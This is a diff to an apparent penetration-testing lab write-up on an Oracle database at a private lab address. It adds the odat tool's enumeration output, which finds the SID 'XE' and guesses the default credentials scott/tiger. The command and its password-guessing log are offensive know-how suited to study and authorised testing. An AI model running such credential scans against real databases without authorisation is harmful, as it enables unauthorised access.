@@ -25,7 +25,9 @@
 	- **E066D214D5421CCC**
 
 
-Using the `odat.py` gave us a valid SID name which is `XE`.
+Using the `odat.py` gave us a valid SID name which is `XE` and the valid credentials containing the below 2 information.
+- **username = scott**
+- **password = tiger**
 
 ```bash
 $ odat all -s 10.129.205.19
@@ -58,7 +60,25 @@ $ odat all -s 10.129.205.19
 100% |#####################################################################################################################################################################################################################| Time: 00:06:21 
 [+] Service Name(s) found on the 10.129.205.19:1521 server: XE,XEXDB
 [!] Notice: SID 'XE' found. Service Name 'XE' found too: Identical database instance. Removing Service Name 'XE' from Service Name list in order to don't do same checks twice
-...(SNIP)...
+[4] (10.129.205.19:1521): Searching valid accounts on the XE SID
+The login cis has already been tested at least once. What do you want to do:                                                                                                | ETA:  00:12:11 
+- stop (s/S)
+- continue and ask every time (a/A)
+- skip and continue to ask (p/P)
+- continue without to ask (c/C)
+c
+[!] Notice: 'ctxsys' account is locked, so skipping this username for password                                                                                              | ETA:  00:40:38 
+[!] Notice: 'dbsnmp' account is locked, so skipping this username for password                                                                                              | ETA:  00:36:50 
+[!] Notice: 'dip' account is locked, so skipping this username for password                                                                                                 | ETA:  00:32:10 
+[!] Notice: 'hr' account is locked, so skipping this username for password                                                                                                  | ETA:  00:21:17 
+[!] Notice: 'mdsys' account is locked, so skipping this username for password##########                                                                                     | ETA:  00:14:00 
+[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password#######################                                                                   | ETA:  00:10:02 
+[!] Notice: 'outln' account is locked, so skipping this username for password###################################                                                            | ETA:  00:08:48 
+[+] Valid credentials found: scott/tiger. Continue...           ##########################################################################                                  | ETA:  00:04:30 
+[!] Notice: 'xdb' account is locked, so skipping this username for password##########################################################################################       | ETA:  00:00:50 
+100% |######################################################################################################################################################################| Time: 00:21:00 
+[+] Accounts found on 10.129.205.19:1521/sid:XE: 
+scott/tiger
 ```
 
 
